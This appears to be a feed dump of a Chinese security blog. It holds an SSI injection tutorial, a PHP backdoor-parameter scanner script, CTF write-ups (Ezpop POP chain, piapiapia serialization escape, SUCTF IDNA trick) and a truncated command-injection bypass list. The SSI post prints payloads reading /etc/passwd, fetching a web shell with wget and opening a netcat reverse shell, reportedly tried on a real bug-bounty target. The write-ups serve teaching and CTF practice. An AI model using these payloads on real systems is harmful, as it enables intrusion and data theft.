        <content type="html"><![CDATA[<p>​                                                      ssi服务端包含注入</p><p>SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。</p><p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p><p>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p><h1 id="SSI-配置和语法"><a href="#SSI-配置和语法" class="headerlink" title="SSI 配置和语法"></a>SSI 配置和语法</h1><h2 id="启用SSI"><a href="#启用SSI" class="headerlink" title="启用SSI"></a>启用SSI</h2><p>示例：Nginx 配置SSI功能</p><p>在http段中加入下面几句即可：</p><pre><code>ssi on;ssi_silent_errors off;ssi_types text/shtml;</code></pre><p>默认Apache不开启SSI，SSI这种技术已经比较少用了。如果应用没有使用到SSI，关闭服务器对SSI的支持即可。</p><h2 id="SSI语法"><a href="#SSI语法" class="headerlink" title="SSI语法"></a>SSI语法</h2><p>首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用#include引用进来</p><pre><code class="html">①显示服务器端环境变量&lt;#echo&gt;本文档名称：&lt;!–#echo var=&quot;DOCUMENT_NAME&quot;–&gt;现在时间：&lt;!–#echo var=&quot;DATE_LOCAL&quot;–&gt;显示IP地址：&lt;! #echo var=&quot;REMOTE_ADDR&quot;–&gt;**②****将文本内容直接插入到文档中&lt;#include&gt;**&lt;! #include file=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;index.html&quot; --&gt;&lt;! #include virtual=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径    ③显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)文件最近更新日期：&lt;! #flastmod file=&quot;文件名称&quot;–&gt;文件的长度：&lt;!–#fsize file=&quot;文件名称&quot;–&gt;④直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)&lt;!–#exec cmd=&quot;文件名称&quot;–&gt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;&lt;!–#exec cgi=&quot;文件名称&quot;–&gt;&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;–&gt;将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。⑤设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式)⑥高级SSI可设置变量使用if条件语句。</code></pre><h1 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h1><p>在很多业务中，用户输入的内容会显示在页面中。比如，一个存在反射型XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，同时服务器又开启了对SSI的支持的话就会存在SSI漏洞。</p><p>从定义中看出，页面中有一小部分是动态输出的时候使用SSI，比如：</p><ul><li>文件相关的属性字段</li><li>当前时间</li><li>访客IP</li><li>调用CGI程序</li></ul><h1 id="SSI注入的条件"><a href="#SSI注入的条件" class="headerlink" title="SSI注入的条件"></a>SSI注入的条件</h1><p>当符合下列条件时，攻击者可以在 Web 服务器上运行任意命令：</p><ul><li><p>Web 服务器已支持SSI（服务器端包含）</p></li><li><p>Web 应用程序未对对相关SSI关键字做过滤</p></li><li><p>Web 应用程序在返回响应的HTML页面时，嵌入用户输入</p></li><li><p>SSI注入常用命令：</p></li><li><pre><code class="html">例子示例 1用于注入 SSI 的命令因使用的服务器操作系统而异。以下命令表示应用于执行 OS 命令的语法。Linux：列出目录下的文件：&lt;!--#exec cmd=&quot;ls&quot; --&gt;访问目录：&lt;!--#exec cmd=&quot;cd /root/dir/&quot;&gt;执行脚本：&lt;!--#exec cmd=&quot;wget http://mysite.com/shell.txt | rename shell.txt shell.php&quot; --&gt;视窗：列出目录下的文件：&lt;!--#exec cmd=&quot;dir&quot; --&gt;访问目录：&lt;!--#exec cmd=&quot;cd C:\admin\dir&quot;&gt;示例 2可用于访问和设置服务器信息的其他 SSI 示例：要更改错误消息输出：&lt;!--#config errmsg=&quot;File not found, informs users and password&quot;--&gt;显示当前文档文件名：&lt;!--#echo var=&quot;DOCUMENT_NAME&quot; --&gt;显示虚拟路径和文件名：&lt;!--#echo var=&quot;DOCUMENT_URI&quot; --&gt;使用“config”命令和“timefmt”参数，可以控制日期和时间输出格式：&lt;!--#config timefmt=&quot;A %B %d %Y %r&quot;--&gt;使用“fsize”命令，可以打印所选文件的大小：&lt;!--#fsize file=&quot;ssi.shtml&quot; --&gt;示例 3IIS 4.0 和 5.0 版本中的一个旧漏洞允许攻击者通过动态链接库（ssinc.dll）中的缓冲区溢出故障来获取系统权限。“ssinc.dll”用于解释进程服务器端包含。 CVE 2001-0506。通过创建包含以下 SSI 代码的恶意页面并强制应用程序加载此页面（路径遍历攻击），可以执行此攻击：ssi_over.shtml&lt;!--#include file=”UUUUUUUU...UU”--&gt;PS：“U”的数量需要大于2049。强制应用程序加载 ssi_over.shtml 页面：非恶意网址：www.vulnerablesite.org/index.asp?page=news.asp恶意网址：www.vulnerablesite.org/index.asp?page=www.malicioussite.com/ssi_over.shtml如果 IIS 返回空白页，则表明发生了溢出。在这种情况下，攻击者可能会操纵程序流并执行任意代码。</code></pre></li></ul><h1 id="SSI挖掘思路"><a href="#SSI挖掘思路" class="headerlink" title="SSI挖掘思路"></a>SSI挖掘思路</h1><p>两个思路：</p><ul><li>从业务场景来Fuzz，比如获取IP、定位、时间等</li><li>识别页面是否包含.stm,.shtm和.shtml后缀</li><li><a href="https://v.duoyinsu.com/"><strong>伏特分布式漏洞扫描平台</strong></a><strong>已经全面支持SSI检测。</strong></li></ul><p>google dork：’inurl:bin/cklb’</p><h1 id="SSI漏洞复现"><a href="#SSI漏洞复现" class="headerlink" title="SSI漏洞复现"></a>SSI漏洞复现</h1><h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><p>我们使用bWAPP来做漏洞演示环境</p><p>选择：’Server-Side Includes (SSI) Injection’</p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"> </p><p>成功执行了代码。</p><pre><code>再使用下exec指令使用cmd作为参数执行服务器端命令：&#39;&lt;!--#exec cmd=&quot;ls -al&quot;--&gt;&#39;</code></pre><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>运气好，刚好遇到个某SRC的。</p><pre><code class="html">&quot;--&gt;&#39;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</code></pre><p>执行命令</p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><pre><code class="html">&quot;--&gt;&#39;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;nc x.x.x.x 9090 -e /bin/bash&quot;--&gt;</code></pre><p>反弹shell</p><p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p><h1 id="SSI防御"><a href="#SSI防御" class="headerlink" title="SSI防御"></a>SSI防御</h1><ul><li>关闭服务器SSI功能</li><li>过滤相关SSI特殊字符（<code>&lt;,&gt;,#,-,&quot;,&#39;</code>）</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从网站源码中寻找后门脚本</title>
      <link href="/2021/10/13/%E4%BB%8E%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E4%B8%AD%E5%AF%BB%E6%89%BE%E5%90%8E%E9%97%A8%E8%84%9A%E6%9C%AC/"/>
      <url>/2021/10/13/%E4%BB%8E%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%E4%B8%AD%E5%AF%BB%E6%89%BE%E5%90%8E%E9%97%A8%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<pre><code class="php">import osimport requestsimport reimport threadingimport timeprint(&#39;开始时间：  &#39;+  time.asctime( time.localtime(time.time()) ))s1=threading.Semaphore(100)                                            #这儿设置最大的线程数filePath = r&quot;D:/soft/phpstudy/PHPTutorial/WWW/src/&quot;os.chdir(filePath)                                                    #改变当前的路径requests.adapters.DEFAULT_RETRIES = 5                                #设置重连次数，防止线程数过高，断开连接files = os.listdir(filePath)session = requests.Session()session.keep_alive = False                                             # 设置连接活跃状态为Falsedef get_content(file):    s1.acquire()                                                    print(&#39;trying   &#39;+file+ &#39;     &#39;+ time.asctime( time.localtime(time.time()) ))    with open(file,encoding=&#39;utf-8&#39;) as f:                            #打开php文件，提取所有的$_GET和$_POST的参数            gets = list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, f.read()))            posts = list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, f.read()))    data = &#123;&#125;                                                        #所有的$_POST    params = &#123;&#125;                                                        #所有的$_GET    for m in gets:        params[m] = &quot;echo &#39;xxxxxx&#39;;&quot;    for n in posts:        data[n] = &quot;echo &#39;xxxxxx&#39;;&quot;    url = &#39;http://127.0.0.1/src/&#39;+file    req = session.post(url, data=data, params=params)            #一次性请求所有的GET和POST    req.close()                                                # 关闭请求  释放内存    req.encoding = &#39;utf-8&#39;    content = req.text    #print(content)    if &quot;xxxxxx&quot; in content:                                    #如果发现有可以利用的参数，继续筛选出具体的参数        flag = 0        for a in gets:            req = session.get(url+&#39;?%s=&#39;%a+&quot;echo &#39;xxxxxx&#39;;&quot;)            content = req.text            req.close()                                                # 关闭请求  释放内存            if &quot;xxxxxx&quot; in content:                flag = 1                break        if flag != 1:            for b in posts:                req = session.post(url, data=&#123;b:&quot;echo &#39;xxxxxx&#39;;&quot;&#125;)                content = req.text                req.close()                                                # 关闭请求  释放内存                if &quot;xxxxxx&quot; in content:                    break        if flag == 1:                                                    #flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，            param = a        else:            param = b        print(&#39;找到了利用文件： &#39;+file+&quot;  and 找到了利用的参数：%s&quot; %param)        print(&#39;结束时间：  &#39; + time.asctime(time.localtime(time.time())))    s1.release()for i in files:                                                            #加入多线程   t = threading.Thread(target=get_content, args=(i,))   t.start()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 脚本 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF2020-Ezpop</title>
      <link href="/2021/10/13/MRCTF2020-Ezpop/"/>
      <url>/2021/10/13/MRCTF2020-Ezpop/</url>
      
        <content type="html"><![CDATA[<h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="MRCTF2020-Ezpop"></a>MRCTF2020-Ezpop</h1><p>打开网页，代码如下：</p><pre><code>Welcome to index.php&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123;    protected  $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file=&#39;index.php&#39;)&#123;        $this-&gt;source = $file;        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    @unserialize($_GET[&#39;pop&#39;]);&#125;else&#123;    $a=new Show;    highlight_file(__FILE__);&#125; </code></pre><p>下面是本题一些魔术方法的介绍：</p><pre><code>__construct 当一个对象创建时被调用，__toString 当一个对象被当作一个字符串被调用。__wakeup() 使用unserialize时触发__get() 用于从不可访问的属性读取数据#难以访问包括：（1）私有属性，（2）没有初始化的属性__invoke() 当脚本尝试将对象调用为函数时触发。</code></pre><p>首先观察敏感函数，在Modifier中发现敏感函数include(),这应该是一个可利用点。问题的关键点就算如何调用Modifier中的include()函数。可以看到里面有一个魔术方法：__invoke(),当脚本尝试将对象调用为函数时触发，那么问题就转化为如何通过构建pop链来触发这个函数。</p><p>Show类中 __ construct并没有什么用。但我们发现了一个敏感点, __ toString魔术方法。它的作用主要就是能echo一个实例化的类（如果这个类没有 __ toString()，则会报错），因为echo时会自动调用__toString()。那么我们看如何才能调用这个魔术方法呢？</p><p>我们发现show类中还有一个过滤：</p><pre><code>preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)</code></pre><p>preg_match（）函数用到source，如果source是字符串，则直接拿来匹配。<br> 如果source是一个类且这个类里有__ toString()方法，则会调用__ toString()。</p><p>所以我们应该使source为一个类来调用__ toString 方法。</p><p>source = new Show();</p><p>调用__ toString后会返回这个：</p><pre><code> return $this-&gt;str-&gt;source;</code></pre><p>我们要考虑该如何利用这个。</p><p>如果令 $this-&gt;str = new Test(),Test()类中没有source,则会自动调用 __ get(),返回一个变量加括号，即函数 $p()。如果我们再让$p = new Modifier()。则相当于返回一个类函数，则会调用Modifier的 __invoke() ，用 $var读取flag.php即可.</p><p>payload:</p><pre><code>&lt;?phpclass Modifier &#123;    protected  $var = &#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;;&#125;class Show&#123;    public $source;    public $str;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;public function __construct($file=&#39;index.php&#39;)&#123;    $this-&gt;str = new Test();    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $p;&#125;$a = new Show();$a-&gt;source = new Show();$a-&gt;source-&gt;str-&gt;p = new Modifier();echo urlencode(serialize($a));?&gt;</code></pre><p>思考：为什么这里要用urlencode编码进行加密？</p><p>因为$var是protected 类型，序列化后要手动加一些字符才能通过。</p><p>贴一段代码：</p><p><img src="/2021/10/13/MRCTF2020-Ezpop/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY0MjYxMA==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0CTF 2016-piapiapia</title>
      <link href="/2021/10/10/0CTF-2016-piapiapia/"/>
      <url>/2021/10/10/0CTF-2016-piapiapia/</url>
      
        <content type="html"><![CDATA[<h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="0CTF 2016-piapiapia"></a>0CTF 2016-piapiapia</h1><p>代码审计还有PHP反序列化一直是我的硬伤，所以想借助这个题目来理一理思路。</p><p>首先，打开网址，如图：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010224803224.png" alt="image-20211010224803224"></p><p>先尝试了万能密码，没有效果。</p><p>sql注入，手工和sqlmap跑半天没有效果，放弃。</p><p>没有什么可以做的，就扫一扫目录。</p><p>python dirsearch.py  -u <a href="http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/">http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/</a> -e * -s 1 -x 400,403,404,500,503,429 -o C:\Users\Sakura\Desktop\1.txt</p><p>buu扫目录一直容易崩溃，所以要降低dirsearch的扫描速度。</p><p>最终扫描出来了 register.php 和<a href="http://www.zip./">www.zip。</a></p><p>进入 xxx/register.php :<br><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010225335750.png" alt="image-20211010225335750"> </p><p>注册账号并登录：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010225502569.png" alt="image-20211010225502569"></p><p>考虑了文件上传，上传多次，没有效果，放弃！</p><p>更新文件后，进入这个界面：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010225645545.png" alt="image-20211010225645545"></p><p>就此停下，不知道如何进行下一步，决定从源码入手。</p><p>访问 <a href="http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/www.zip">http://7580b1d4-c607-4a67-a008-092706787c67.node4.buuoj.cn:81/www.zip</a></p><p>获取到了网站源码。</p><p>进行苦逼的代码审计：</p><p>由上方可知逻辑结构为：register-&gt;login-&gt;update-&gt;profile</p><p>登录和注册可以先不看，由 update-&gt;profile</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010225831335.png" alt="image-20211010225831335"></p><p>首先查看config.php，看到了flag但是为空，没有显示,这里要注意下config.php，下面可能会用到。</p><p>继续浏览代码，寻找敏感点：</p><p>在profile.php中发现了两个关键点，unserialize(),file_get_contents()</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230540368.png" alt="image-20211010230540368"></p><p>猜测应该考察PHP反序列化，$profile[‘photo’] 是重点，考虑对其传值，实现flag的读取。</p><p>进一步审计：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230732653.png" alt="image-20211010230732653"></p><p>在update.php中发现了这样一个函数：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230845047.png" alt="image-20211010230845047"></p><p>$profile[‘photo’] = ‘upload/‘ . md5($file[‘name’]);</p><p>发现该值被hash加密了，根本无法对其进行控制。</p><p>既然profile[‘photo’] 无法控制，我们是否可以考虑传入其它值来达到目的。看profile[‘photo’]的上一个参数，profile[‘nickname’]，是否可以通过profile[‘nickname’]传值给profile[‘photo’]呢.</p><p>继续看unserialize($profile)</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230540368.png" alt="image-20211010230540368"></p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010232230667.png" alt="image-20211010232230667"></p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010232355284.png" alt="image-20211010232355284"></p><p>由此可知，对像user中show_profile()的返回值被反序列化，查看show_porfile函数：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010233728714.png" alt="image-20211010233728714"></p><p>$username首先会被过滤一次，跟进filter()函数：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010235353988.png" alt="image-20211010235353988"></p><p>这里的意思是\会被|替代，一些敏感的sql单词会被hacker代替(上文的select,insert,update,delete,where)</p><p>过滤后，$username会被插入到select语句中：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010235733254.png" alt="image-20211010235733254"></p><p>到此，基本明白了网站的运行逻辑。</p><p>接下来继续从反序列化入手：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230540368.png" alt="image-20211010230540368"></p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211010230845047.png" alt="image-20211010230845047"></p><p>接上面的思路，由于profile=[‘photo’] 我们无法控制，而fileter过滤，如果存在where则会变为hacker，增加了一个字符，所以考察的知识点应该为字符串增加的PHP反序列化逃逸。这里会对$profile进行序列化。</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011003440679.png" alt="image-20211011003440679"></p><p>修改phpto的值</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011010728666.png" alt="image-20211011010728666"></p><p>要注意，最后还要通过update.php中还存在一个限制：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011011455216.png" alt="image-20211011011455216"></p><p>nickname的长度不可以&gt;10,那该怎么绕过它呢？</p><p>这里就要用到数组了</p><pre><code>md5(Array()) = nullsha1(Array()) = nullereg(pattern,Array()) =nullpreg_match(pattern,Array()) = falsestrcmp(Array(), “abc”) =nullstrpos(Array(),“abc”) = nullstrlen(Array()) = null</code></pre><p>所以nickname传入数组就可以绕过。</p><p>如何将nickname变为数组呢？让我们来看一个例子：</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70.png" alt="img"></p><pre><code>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;15885248522&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:3:&quot;123&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/9f6e6800cfae7749eb6c486619254b9c&quot;;&#125;</code></pre><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011014313810.png" alt="image-20211011014313810"></p><p>要让 </p><pre><code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre><p>逃逸出来</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011014619609.png" alt="image-20211011014619609"></p><p>34个字符，所以应该有34个where来逃逸34个字符。</p><p>6*34=204</p><pre><code>a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;15885248522&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/9f6e6800cfae7749eb6c486619254b9c&quot;;&#125;</code></pre><p>所以payload就为：</p><pre><code>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></pre><p>在burp中将nickname类型改为数组，并传入payload</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011015434242.png" alt="image-20211011015434242"></p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011015942962.png" alt="image-20211011015942962"></p><p>查看源代码，可发现base64加密</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011020008050.png" alt="image-20211011020008050"></p><p>解密即可得到flag</p><p><img src="/2021/10/10/0CTF-2016-piapiapia/image-20211011020027430.png" alt="image-20211011020027430"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2019-python-nginx</title>
      <link href="/2021/10/10/SUCTF2019-python-nginx/"/>
      <url>/2021/10/10/SUCTF2019-python-nginx/</url>
      
        <content type="html"><![CDATA[<p>题目源码：</p><pre><code>@app.route(&#39;/getUrl&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;]) def getUrl():   url = request.args.get(&quot;url&quot;)   host = parse.urlparse(url).hostnameif host == &#39;suctf.cc&#39;:   return &quot;我扌 your problem? 111&quot;parts = list(urlsplit(url)) host = parts[1]if host == &#39;suctf.cc&#39;:   return &quot;我扌 your problem? 222 &quot; + host newhost = []for h in host.split(&#39;.&#39;):   newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))   parts[1] = &#39;.&#39;.join(newhost)  # 去掉 url 中的空格   finalUrl = urlunsplit(parts).split(&#39; &#39;)[0]   host = parse.urlparse(finalUrl).hostnameif host == &#39;suctf.cc&#39;:   return urllib.request.urlopen(finalUrl).read()else :  return &quot;我扌 your problem? 333&quot;</code></pre><h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>该题的主要问题是在</p><p>h.encode(‘idna’).decode(‘utf-8’)</p><p>IDNA实际上是国际化域名</p><p>什么是IDN?</p><p>国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名，是指部分或完全使用特殊文字或字母组成的互联网域名，包括中文、发育、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经过多字节万国码编码而成。在域名系统中，国际化域名使用punycode转写并以ASCII字符串存储。</p><p><img src="/2021/10/10/SUCTF2019-python-nginx/1.png"></p><p>Nginx重要配置文件：</p><pre><code>配置文件存放目录：/etc/nginx主配置文件：/etc/nginx/conf/nginx.conf管理脚本：/usr/lib64/systemd/system/nginx.service模块：/usr/lisb64/nginx/modules应用程序：/usr/sbin/nginx程序默认存放位置：/usr/share/nginx/html日志默认存放位置：/var/log/nginx配置文件目录为：/usr/local/nginx/conf/nginx.conf</code></pre><p>利用脚本来跑可用字符：</p><pre><code class="#">for i in range(128,65537):        tmp=chr(i)        try:                res = tmp.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;)                if(&quot;-&quot;) in res:                        continue                print(&quot;U:&#123;&#125;    A:&#123;&#125;      ascii:&#123;&#125; &quot;.format(tmp, res, i))        except:                pass</code></pre><p><img src="/2021/10/10/SUCTF2019-python-nginx/3.png"><br>发现可利用字符,获取flag：<br><img src="/2021/10/10/SUCTF2019-python-nginx/2.png"></p><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>利用两此urlsplit漏洞：<br>这道题不能让他为suctf.cc<br><img src="/2021/10/10/SUCTF2019-python-nginx/5.png"><br>但是经过了 urlunsplit 后变成 suctf.cc，很容易就构造出：file////:suctf.cc/usr/local/nginx/conf/nginx.conf，这样就能读取文件了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/2021/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/10/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>php调用外部程序常用的函数：<br>system()—执行shell命令也就是向dos发送一条指令。<br>shell_exec() — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。<br>exec() —执行外部程序。<br>passthru() — 执行外部程序并且显示原始输出。</p><p>绕过技巧：</p><h1 id="常见管道符"><a href="#常见管道符" class="headerlink" title="常见管道符"></a>常见管道符</h1><pre><code class="php">‘|’ 直接执行后面的语句‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句‘&amp;’ 前面和后面命令都要执行，无论前面真假&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令Linux:Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&amp;’ 作用相同</code></pre><h1 id="空格绕过-空格被过滤"><a href="#空格绕过-空格被过滤" class="headerlink" title="空格绕过(空格被过滤"></a>空格绕过(空格被过滤</h1><pre><code class="php">&lt;  --  重定向，如cat&lt;flag.php&lt;&gt;      --   重定向，如cat&lt;&gt;flag.php%09  --  需要php环境，如cat%09flag.php$&#123;IFS&#125;  --  单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个&#123;&#125;就固定了变量名，如cat$&#123;IFS2&#125;flag.php$IFS$9  --  